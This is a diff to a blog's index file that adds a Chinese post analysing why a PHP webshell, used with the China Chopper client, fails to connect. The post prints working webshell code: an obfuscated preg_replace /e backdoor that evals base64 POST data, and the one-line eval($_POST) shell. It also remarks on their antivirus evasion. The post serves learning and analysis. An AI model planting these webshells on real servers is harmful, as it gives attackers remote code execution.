@@ -4,6 +4,33 @@
   
     
     <entry>
+      <title>面白i安全小记 | 中国菜刀之连不上的奇怪马</title>
+      <link href="2021/05/17/fun-cyber-sec-1/"/>
+      <url>2021/05/17/fun-cyber-sec-1/</url>
+      
+        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><h2 id="本栏目前言"><a href="#本栏目前言" class="headerlink" title="本栏目前言"></a>本栏目前言</h2><p>以前总是和别人一起研究过许多平常没咋注意，但是又非常有意思的小姿势，然后弄完后，但过了许久不用细节可能就忘的差不多了。所以想着开了个小栏目来记录一下一些我平常没咋注意到的、有趣的安全相关内容，可能更新也不是特别的频繁，毕竟不是天天都能遇到这些奇奇怪怪的点的，哈哈。</p><h2 id="正题"><a href="#正题" class="headerlink" title="正题"></a>正题</h2><p>这要和一个在备考 PTE 的同学说起，这是3月份的事情了（之前为了解释清楚写了个文档，一直在语雀扔着）</p><p>这个菜刀连接马长这样的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">@<span class="variable">$a</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;Hello&#x27;</span>]; </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$a</span>))&#123; </span><br><span class="line">@preg_replace(<span class="string">&quot;/\[(.*)\]/e&quot;</span>,<span class="string">&#x27;\\1&#x27;</span>,base64_decode(<span class="string">&#x27;W0BldmFsKGJhc2U2NF9kZWNvZGUoJF9QT1NUW3owXSkpO10=&#x27;</span>)); </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>不过他说连不上，我就奇怪了，你们老师发的马竟然连不上，不应该呀。。</p><p>然后和他激烈的讨论了一波，无果</p><p><img src="/img/fun-cyber-sec-1/image-20210518000346174.png" class="lazyload" data-srcset="/img/fun-cyber-sec-1/image-20210518000346174.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210518000346174"></p><p>回到宿舍分析了一波，首先看马的主要函数 <code>preg_replace</code> </p><ul><li><p>第一个参数表示匹配的模式，这里是匹配 <code>[(.*)]</code> 里的内容，</p></li><li><ul><li><code>/e</code> 表示把第二个参数里的内容当作php代码来解析</li></ul></li><li><p>第三个参数base64解码为 <code>[@eval(base64_decode($_POST[z0]));]</code></p></li><li><p>第二个参数 <code>\\1</code> 在正则表达式里表示匹配的第一个括号中的内容</p></li></ul><p>因此</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@preg_replace(<span class="string">&quot;/\[(.*)\]/e&quot;</span>,<span class="string">&#x27;\\1&#x27;</span>,base64_decode(<span class="string">&#x27;W0BldmFsKGJhc2U2NF9kZWNvZGUoJF9QT1NUW3owXSkpO10=&#x27;</span>)); </span><br></pre></td></tr></table></figure><p>表示</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@<span class="keyword">eval</span>(base64_decode(<span class="variable">$_POST</span>[z0]));</span><br></pre></td></tr></table></figure><p>那为什么密码是 <code>Hello</code> 呢，来观察一下中国菜刀连接的包，</p><p><a href="https://github.com/raddyfiy/caidao-official-version">https://github.com/raddyfiy/caidao-official-version</a></p><ul><li>2016 版本不行，抓包后发现，连接机制不一样…</li><li>2014 版本可以正常连接</li><li>2011版本也可以正常连接，看包也更直观看出，2333</li></ul><p>以 2014版本为例，wireshark 抓包</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1615613197121-749b300c-0582-463f-b961-d1c84e887f22.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1615613197121-749b300c-0582-463f-b961-d1c84e887f22.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>可以看到菜刀，无论你密码是啥，密码参数只是跳板，他会传入一些值，然后上面我们感到疑惑的马 <code>if</code> 不为空即可过，然后 z0 才是真正的马。base解码后为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@ini_set(<span class="string">&quot;display_errors&quot;</span>,<span class="string">&quot;0&quot;</span>);@set_time_limit(<span class="number">0</span>);@set_magic_quotes_runtime(<span class="number">0</span>);<span class="keyword">echo</span>(<span class="string">&quot;-&gt;|&quot;</span>);;<span class="variable">$D</span>=dirname(<span class="keyword">__FILE__</span>);<span class="variable">$R</span>=<span class="string">&quot;<span class="subst">&#123;$D&#125;</span>\t&quot;</span>;<span class="keyword">if</span>(substr(<span class="variable">$D</span>,<span class="number">0</span>,<span class="number">1</span>)!=<span class="string">&quot;/&quot;</span>)&#123;<span class="keyword">foreach</span>(range(<span class="string">&quot;A&quot;</span>,<span class="string">&quot;Z&quot;</span>) <span class="keyword">as</span> <span class="variable">$L</span>)<span class="keyword">if</span>(is_dir(<span class="string">&quot;<span class="subst">&#123;$L&#125;</span>:&quot;</span>))<span class="variable">$R</span>.=<span class="string">&quot;<span class="subst">&#123;$L&#125;</span>:&quot;</span>;&#125;<span class="variable">$R</span>.=<span class="string">&quot;\t&quot;</span>;<span class="variable">$u</span>=(function_exists(<span class="string">&#x27;posix_getegid&#x27;</span>))?@posix_getpwuid(@posix_geteuid()):<span class="string">&#x27;&#x27;</span>;<span class="variable">$usr</span>=(<span class="variable">$u</span>)?<span class="variable">$u</span>[<span class="string">&#x27;name&#x27;</span>]:@get_current_user();<span class="variable">$R</span>.=php_uname();<span class="variable">$R</span>.=<span class="string">&quot;(<span class="subst">&#123;$usr&#125;</span>)&quot;</span>;<span class="keyword">print</span> <span class="variable">$R</span>;;<span class="keyword">echo</span>(<span class="string">&quot;|&lt;-&quot;</span>);<span class="keyword">die</span>();</span><br></pre></td></tr></table></figure><p>平常我们的木马是类似于这样的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;abc&#x27;</span>]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>我们传入的密码是 <code>abc</code> ，其实他是会把 <code>abc</code> 传入的东西 <code>eval</code> 一下变成代码，然后把 <code>z0</code> 值传入，如果成功，就成功啦~</p><p>所以上面的 <code>z0</code> 不用传，就是因为菜刀客户端会自动传。2016版不行，因为新版机制不一样了，2333</p><p>这是 2011 版本菜刀的包，感觉比 2014版更清晰一点~</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1615614006844-e733d96c-b7e7-459b-a3bc-a121755d072a.png" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1615614006844-e733d96c-b7e7-459b-a3bc-a121755d072a.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>感觉这样一看就捋顺了，顺便收获了人生中语雀的第 1 个赞，泪目</p><p><img src="/img/fun-cyber-sec-1/image-20210518000840645.png" class="lazyload" data-srcset="/img/fun-cyber-sec-1/image-20210518000840645.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210518000840645"></p><p>不过还是有点佩服，给这个马的作者对菜刀的机制研究的应该算是比较深入和透彻了，模板.jpg</p><p>感觉这马还能起到一丢丢的免杀作用，2333，尤其是在 2011年的时候，估计是比较不错的连接马了。</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 面白i安全小记 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 面白i安全小记 </tag>
+            
+            <tag> 中国菜刀 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>2021 红帽杯前3Web题 Writeup（持续更新）</title>
       <link href="2021/05/09/2021hmb/"/>
       <url>2021/05/09/2021hmb/</url>
@@ -84,9 +111,9 @@
             
             <tag> ctf </tag>
             
-            <tag> ctf练习 </tag>
-            
             <tag> ctfshow </tag>
+            
+            <tag> ctf练习 </tag>
             
         </tags>
       
@@ -117,9 +144,9 @@
             
             <tag> ctf </tag>
             
-            <tag> hackme </tag>
-            
             <tag> ctf练习 </tag>
+            
+            <tag> hackme </tag>
             
         </tags>
       
@@ -150,9 +177,9 @@
             
             <tag> ctf </tag>
             
-            <tag> ctf练习 </tag>
-            
             <tag> ctfshow </tag>
+            
+            <tag> ctf练习 </tag>
             
         </tags>
       
@@ -183,9 +210,9 @@
             
             <tag> ctf </tag>
             
-            <tag> ctf练习 </tag>
-            
             <tag> ctfshow </tag>
+            
+            <tag> ctf练习 </tag>
             
         </tags>
       
